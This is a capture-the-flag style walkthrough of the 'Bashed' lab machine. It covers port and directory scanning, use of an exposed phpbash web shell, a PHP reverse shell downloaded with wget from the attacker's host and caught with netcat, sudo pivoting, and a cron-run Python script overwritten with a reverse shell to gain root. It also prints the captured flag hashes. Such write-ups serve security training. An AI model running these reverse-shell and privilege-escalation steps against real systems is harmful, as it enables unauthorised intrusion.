## IP

> 10.10.10.68

## nmap scan

```
nmap -T4 -A 10.10.10.68 -Pn
```

```a
Nmap scan report for 10.10.10.68
Host is up (0.11s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

Network Distance: 2 hops

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   69.34 ms 10.10.16.1
2   35.19 ms 10.10.10.68

```

## Open Ports

> 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

HTTP

## HTTP

http://10.10.10.68/

```
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt
```

>/.hta                 (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/index.html           (Status: 200) [Size: 7743]                                
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]    
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]   
/server-status        (Status: 403) [Size: 299]                                 
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]

After doing dirbuster we found the /dev folder and inside phpbash.php

We have a shell(?)

# Post Exploitation

### Getting user.txt

```
cd /home/arrexel
cat user.txt
```

> 2c281f318555dbc1b856957c7147bfc1

## Becoming root

```sudo su```

Nope

```sudo -l```

> User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL 

We can run commands as scriptmanager user with no password

```history```

Nope

Lets try to upload a payload

```cd /var/www/html/uploads```

Lets create a reverse shell

Download (http://pentestmonkey.net/tools/web-shells/php-reverse-shell) The payload from here and change the ip to your tun0 and the port to whatever you want

Create a python server and host the shell 

```
python -m SimpleHTTPServer [Port]
```

Get the payload on the online shell
```
wget http://[YOUR IP]/rev.php
```

Close the server and open a listener

```nc -nlvp [SAME PORT AS PAYLOAD]```

open http://10.10.10.68/uploads/rev.php

Now we have a shell on our computer

Lets try to improve the shell (https://netsec.ws/?p=337)

```python -c 'import pty; pty.spawn("/bin/bash")'``` 
 
 Like that we improved it!
 
 Lets connect into scriptmanager
 
 ```sudo su scriptmanager```
 
 We could not without a password
 
 Lets try another way
 
 ```sudo -u scriptmanager /bin/bash```
 
 Like that worked! Now we are scriptmanager 
 
 ```sudo -l```
 
 Nope
 
 ```history```
 
 Nope

```ls -la```

There is a scripts folder, lets check it

Inside scripts we see test.py and test.txt, we can modify test.py and we can notice that test.txt is owned by root

tes.txt updates every minute according to the script in test.py, so lets change it for a python reverse shell (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Lets get the shell instead of the normal test.py

Create a file in your computer with the python reverse shell and call it test.py

Set up a python host with the file 


```
python -m SimpleHTTPServer [Port]
```

Get the payload on the shell
```
rm test.py
wget http://[YOUR IP]/test.py
```

Set up a listener 

```nc -nlvp [SAME PORT AS PAYLOAD]```

We wait..... no we are root!!!

## Getting root.txt
```
cd /root
cat root.txt
```

>cc4f0afe3a1026d402ba10329674a8e2